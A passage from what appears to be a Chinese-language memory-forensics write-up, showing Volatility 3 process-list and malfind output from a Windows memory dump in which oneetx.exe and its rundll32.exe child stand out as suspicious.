&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1840&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> spoolsv.exe 0xad8187acb200 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:03.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1892&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187b34080 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:05.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2024&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187b65240 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:11.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2076&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8187b94080 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:19.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2144&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> vmtoolsd.exe 0xad81896ab080 &lt;span style="color:#ae81ff">11&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:19.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2152&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> vm3dservice.ex 0xad81896ae240 &lt;span style="color:#ae81ff">2&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:19.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2200&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> VGAuthService. 0xad81896b3300 &lt;span style="color:#ae81ff">2&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:28:19.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2404&lt;/span> &lt;span style="color:#ae81ff">2152&lt;/span> vm3dservice.ex 0xad8186619200 &lt;span style="color:#ae81ff">2&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:28:32.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3028&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> dllhost.exe 0xad8185907080 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:29:20.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">832&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> msdtc.exe 0xad8185861280 &lt;span style="color:#ae81ff">9&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:29:25.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1232&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8186f4a2c0 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:29:39.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1392&lt;/span> &lt;span style="color:#ae81ff">448&lt;/span> sihost.exe 0xad8189e94280 &lt;span style="color:#ae81ff">11&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:08.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1064&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8189d7c2c0 &lt;span style="color:#ae81ff">15&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:09.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1600&lt;/span> &lt;span style="color:#ae81ff">448&lt;/span> taskhostw.exe 0xad8189d07300 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:09.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3204&lt;/span> &lt;span style="color:#ae81ff">752&lt;/span> ctfmon.exe 0xad8189c8b280 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:11.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3556&lt;/span> &lt;span style="color:#ae81ff">588&lt;/span> userinit.exe 0xad818c02f340 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:28.000000 2023-05-21 22:30:43.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3580&lt;/span> &lt;span style="color:#ae81ff">3556&lt;/span> explorer.exe 0xad818c047340 &lt;span style="color:#ae81ff">76&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:30:28.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3944&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> WmiPrvSE.exe 0xad818c054080 &lt;span style="color:#ae81ff">13&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:30:44.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3004&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818c4212c0 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:30:55.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1116&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818c426080 &lt;span style="color:#ae81ff">6&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:00.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3160&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> StartMenuExper 0xad818cad3240 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:21.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4116&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad818cd93300 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:24.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4228&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> SearchIndexer. 0xad818ce06240 &lt;span style="color:#ae81ff">15&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:31:27.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4448&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad818c09a080 &lt;span style="color:#ae81ff">9&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:33.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">464&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> SecurityHealth 0xad818979d080 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:59.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3252&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> vmtoolsd.exe 0xad8189796300 &lt;span style="color:#ae81ff">8&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:31:59.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5136&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> SecurityHealth 0xad818d374280 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:32:01.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5328&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> msedge.exe 0xad818d0980c0 &lt;span style="color:#ae81ff">54&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:02.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4396&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818d515080 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:19.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1144&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818d75f080 &lt;span style="color:#ae81ff">18&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:38.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4544&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818d75b080 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:39.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5340&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818d7b3080 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:39.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5704&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad8185962080 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:44.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1764&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> dllhost.exe 0xad818d176080 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:32:48.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1916&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> SearchApp.exe 0xad818d099080 &lt;span style="color:#ae81ff">24&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:33:05.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6200&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> SgrmBroker.exe 0xad818d09f080 &lt;span style="color:#ae81ff">7&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:33:42.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6696&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818c532080 &lt;span style="color:#ae81ff">8&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:34:07.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7312&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> ApplicationFra 0xad818e84f300 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:35:44.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7772&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818e88e140 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:36:03.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6724&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> Outline.exe 0xad818e578080 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 22:36:09.000000 2023-05-21 23:01:24.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4224&lt;/span> &lt;span style="color:#ae81ff">6724&lt;/span> Outline.exe 0xad818e88b080 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 22:36:23.000000 2023-05-21 23:01:24.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7160&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> SearchApp.exe 0xad818ccc4080 &lt;span style="color:#ae81ff">57&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:39:13.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4628&lt;/span> &lt;span style="color:#ae81ff">6724&lt;/span> tun2socks.exe 0xad818de82340 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 22:40:10.000000 2023-05-21 23:01:24.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6048&lt;/span> &lt;span style="color:#ae81ff">448&lt;/span> taskhostw.exe 0xad818dc5d080 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:40:20.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8264&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad818eec8080 &lt;span style="color:#ae81ff">4&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:40:33.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3608&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818d07a080 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:41:28.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6644&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> SkypeApp.exe 0xad818d3ac080 &lt;span style="color:#ae81ff">49&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:41:52.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5656&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad81876e8080 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 21:58:19.000000 2023-05-21 22:02:01.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8952&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> TextInputHost. 0xad818e6db080 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 21:59:11.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5808&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> HxTsr.exe 0xad818de5d080 &lt;span style="color:#ae81ff">0&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 21:59:58.000000 2023-05-21 22:07:45.000000 Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2388&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818e54c340 &lt;span style="color:#ae81ff">18&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:05:35.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6292&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818d7a1080 &lt;span style="color:#ae81ff">20&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:06:15.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">3876&lt;/span> &lt;span style="color:#ae81ff">448&lt;/span> taskhostw.exe 0xad8189b30080 &lt;span style="color:#ae81ff">8&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:08:02.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">372&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> SkypeBackgroun 0xad8186f49080 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:10:00.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1120&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> MsMpEng.exe 0xad818945c080 &lt;span style="color:#ae81ff">12&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:10:01.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6076&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> ShellExperienc 0xad818eb18080 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:11:36.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7336&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> RuntimeBroker. 0xad818e8bb080 &lt;span style="color:#ae81ff">2&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:11:39.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7964&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818dee5080 &lt;span style="color:#ae81ff">19&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:22:09.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6544&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818c0ea080 &lt;span style="color:#ae81ff">18&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:22:35.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5964&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818ef86080 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:27:56.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8896&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad8187a39080 &lt;span style="color:#ae81ff">18&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:28:21.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5156&lt;/span> &lt;span style="color:#ae81ff">5328&lt;/span> msedge.exe 0xad818c553080 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:28:22.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5896&lt;/span> &lt;span style="color:#ae81ff">8844&lt;/span> oneetx.exe 0xad8189b41080 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 22:30:56.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7732&lt;/span> &lt;span style="color:#ae81ff">5896&lt;/span> rundll32.exe 0xad818d1912c0 &lt;span style="color:#ae81ff">1&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 22:31:53.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6324&lt;/span> &lt;span style="color:#ae81ff">1496&lt;/span> audiodg.exe 0xad818df2e080 &lt;span style="color:#ae81ff">4&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:42:56.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2228&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> FTK Imager.exe 0xad818d143080 &lt;span style="color:#ae81ff">10&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:43:56.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5636&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> notepad.exe 0xad818db45080 &lt;span style="color:#ae81ff">1&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 22:46:50.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2044&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad8189b27080 &lt;span style="color:#ae81ff">28&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:49:29.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8708&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818d431080 &lt;span style="color:#ae81ff">5&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:57:33.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5476&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> svchost.exe 0xad818e752080 &lt;span style="color:#ae81ff">9&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:58:08.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6596&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> TrustedInstall 0xad818dc88080 &lt;span style="color:#ae81ff">4&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:58:13.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">2332&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> TiWorker.exe 0xad818e780080 &lt;span style="color:#ae81ff">4&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 22:58:13.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4340&lt;/span> &lt;span style="color:#ae81ff">676&lt;/span> VSSVC.exe 0xad818e888080 &lt;span style="color:#ae81ff">3&lt;/span> - &lt;span style="color:#ae81ff">0&lt;/span> False 2023-05-21 23:01:06.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7540&lt;/span> &lt;span style="color:#ae81ff">824&lt;/span> smartscreen.ex 0xad818e893080 &lt;span style="color:#ae81ff">14&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 23:02:26.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8920&lt;/span> &lt;span style="color:#ae81ff">3580&lt;/span> FTK Imager.exe 0xad818ef81080 &lt;span style="color:#ae81ff">20&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> False 2023-05-21 23:02:28.000000 N/Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5480&lt;/span> &lt;span style="color:#ae81ff">448&lt;/span> oneetx.exe 0xad818d3d6080 &lt;span style="color:#ae81ff">6&lt;/span> - &lt;span style="color:#ae81ff">1&lt;/span> True 2023-05-21 23:03:00.000000 N/Disabled
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>方法二: 用malfind排出一些正常的process
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python vol.py -f MemoryDump.mem windows.malfind
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility &lt;span style="color:#ae81ff">3&lt;/span> Framework 2.4.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Progress: 100.00 PDB scanning finished
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PID Process Start VPN End VPN Tag Protection CommitCharge PrivateMemory File output Hexdump Disasm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5896&lt;/span> oneetx.exe 0x400000 0x437fff VadS PAGE_EXECUTE_READWRITE &lt;span style="color:#ae81ff">56&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> Disabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>4d 5a &lt;span style="color:#ae81ff">90&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">03&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> MZ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">04&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ff ff &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b8 &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">40&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> @.......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> ........
